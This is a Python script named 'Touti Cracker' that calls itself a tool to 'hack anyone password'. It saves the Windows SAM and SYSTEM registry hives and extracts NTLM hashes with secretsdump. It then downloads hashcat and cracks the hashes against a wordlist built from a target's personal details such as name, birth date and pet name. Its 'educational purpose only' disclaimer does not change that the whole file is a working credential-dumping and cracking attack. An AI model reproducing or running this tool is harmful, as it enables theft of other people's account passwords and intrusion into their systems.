import secrets
import pyfiglet
import os
import requests
import subprocess
try:
    gui = pyfiglet.figlet_format("Touti Cracker", font="slant")
    print(gui)
    the_link="https://github.com/Touti-Sudo"
    info=print("Welcome to Touti cracker and thank you for choosing my hacking tool if you want more informations about my tool you can check my README.txt you can also check my Github account:" + the_link + "\nThis tool will allow you to hack anyone password. This is for educationnal purpose only , i am not responsible for any bad and suspecious activities.Thank you for counsidring my words !! (this version is now just compatible for windows 11 but new updates will make it cross platform this my github account for more details) ")
    user=input("\nwhat is the name of the  local acount that you are using on your computer ? : ")
except KeyboardInterrupt:
    print("\nProgram interrupted. Exiting...")
    exit()
def sauvegarder_registres():
    print("Saving Registry keys...")
    chemin_backup = "C:\\Users\\"+user+"\\Desktop\\Backup"
    chemin_system_save = os.path.join(chemin_backup, "system.save")
    chemin_sam_save = os.path.join(chemin_backup, "sam.save")

   
    os.makedirs(chemin_backup, exist_ok=True)

   
    if os.path.exists(chemin_system_save) and os.path.exists(chemin_sam_save):
        print("Registry keys already saved. Skipping registry saving...")
        return


    commande_system = f'reg save HKLM\\system "{chemin_system_save}"'
    commande_sam = f'reg save HKLM\\sam "{chemin_sam_save}"'

    result_system = subprocess.run(commande_system, shell=True, capture_output=True, text=True)
    if result_system.returncode == 0:
        print("System registry key saved successfully.")
    else:
        print(f"Error saving system registry key: {result_system.stderr}")

    result_sam = subprocess.run(commande_sam, shell=True, capture_output=True, text=True)
    if result_sam.returncode == 0:
        print("SAM registry key saved successfully.")
    else:
        print(f"Error saving SAM registry key: {result_sam.stderr}")

def cracker():
    request = input("Do you want to crack a password using that wordlist? (y/n): ").strip().lower()
    if request != "y":
        return

    chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
    systemtype = input("On which system are you? (e.g., Windows 11, Linux distro): ").strip().lower()

    if systemtype == "windows 11":
        chemin_fichier_de_hashcat = "C:\\Users\\"+ user +"\\hashcat"
        hashcatpath = "C:\\Users\\"+ user +"\\hashcat\\hashcat-6.2.6.7z"
        url = r"https://hashcat.net/files/hashcat-6.2.6.7z"
        chemin_extraction = "C:\\Users\\"+ user +"\\hashcat\\extracted"

    
        os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)

        if not os.path.exists(hashcatpath):
            print("Downloading Hashcat...")
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(hashcatpath, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        file.write(chunk)
                print("Hashcat downloaded successfully.")
            else:
                print("Failed to download Hashcat.")
                return

   
        if not os.path.exists(chemin_extraction):
            os.makedirs(chemin_extraction, exist_ok=True)
            command = f'"C:\\Program Files\\7-Zip\\7z.exe" x "{hashcatpath}" -o"{chemin_extraction}" -y'
            print("Unzipping Hashcat...")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print("Hashcat unzipped successfully.")
            else:
                print(f"Error unzipping Hashcat: {result.stderr}")
                return

   
        sauvegarder_registres()

   
        print("Extracting hashes from system and SAM files...")
        command_for_extracth = "py C:\\Users\\"+user+"\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\secretsdump.py -sam C:\\Users\\"+user+"\\Desktop\\Backup\\sam.save -system C:\\Users\\"+user+"\\Desktop\\Backup\\system.save LOCAL"
        resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
        print("These are the results:\n" + resultextract.stdout)


        yourhash = input("Please write the hash that you want to crack from the results: ")
        chemin_extraction2 = "C:\\Users\\"+user+"\\hashcat\\extracted\\hashcat-6.2.6\\hashcat.exe"
        print("Launching Hashcat...")

        command_lunch_hashcat = f'"{chemin_extraction2}" -m 1000 "{yourhash}" "{chemin_fichier}"'
        command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
        print(command_lunch_hashcats.stdout)    
        if command_lunch_hashcats.stderr:
            print("\n=== Hashcat Errors ===")
            print(command_lunch_hashcats.stderr)

def generer_mots_de_passe():
    chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
    number_of_generated_words = int(input("How many passwords do you want to generate for brute force? : "))
    informations = []

    print("Provide information to generate passwords (press 0 to skip):")
    Name = input("First Name: ") or ""
    Family = input("Family Name: ") or ""
    Nick = input("Nick Name: ") or ""
    birth = input("Date of birth (DD/MM/YYYY): ") or ""
    pet = input("Pet Name: ") or ""
    country = input("Country: ") or ""
    city = input("City: ") or ""

    informations.extend([Name, Family, Nick, birth, pet, country, city])
    informations = [info for info in informations if info]  

    os.makedirs(os.path.dirname(chemin_fichier), exist_ok=True)

    with open(chemin_fichier, "w", encoding="utf-8") as fichier:
        print("\nGenerated Passwords:")
        for i in range(number_of_generated_words):
            longeur = secrets.choice(range(3, 16))
            mot_de_passe = ''.join(secrets.choice(informations) for _ in range(longeur))
            mot_de_passee = f"{i + 1}. {mot_de_passe}"
            print(mot_de_passee)
            fichier.write(mot_de_passee + "\n")

    print(f"\nAll passwords have been saved to: {chemin_fichier}")
    cracker()



while True:
    try:
        choice = input("Do you want to specify information and generate passwords? (y/n): ").strip().lower()
        if choice == "y":
            generer_mots_de_passe()
            break
        elif choice == "n":
            chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
            chifrre = "0123456789"
            lettre = "azertyuiopmlkjhgfdsqwxcvbn"
            lettreup = lettre.upper()
            caractere_special = "}@()é&à=+-*/ç_²$ù^!;,"
            number_of_generated_words = int(input("How many passwords do you want to generate for brute force? : "))
            liste_complete = list(lettre + chifrre + lettreup + caractere_special)
            dossier = os.path.dirname(chemin_fichier)
            if not os.path.exists(dossier):
                os.makedirs(dossier)

            with open(chemin_fichier, "w", encoding="utf-8") as fichier:
                print("\nGenerated Passwords:")
                for i in range(number_of_generated_words):
                    longeur =secrets.choice(range(3, 17)) 
                    mot_de_passe = ''.join(secrets.choice(liste_complete,) for _ in range(longeur))
                    mot_de_passee = f"{i + 1}. {mot_de_passe}"
                    print(mot_de_passee)
                    fichier.write(mot_de_passee + "\n")

            print(f"\nAll passwords have been saved to: {chemin_fichier}")
            cracker()
            break
        else:
            print("Please enter a valid choice (y/n).")
    except KeyboardInterrupt:
        print("\nProgram interrupted. Exiting...")
        break
    except ValueError as e:
        print(f"Error: {e}")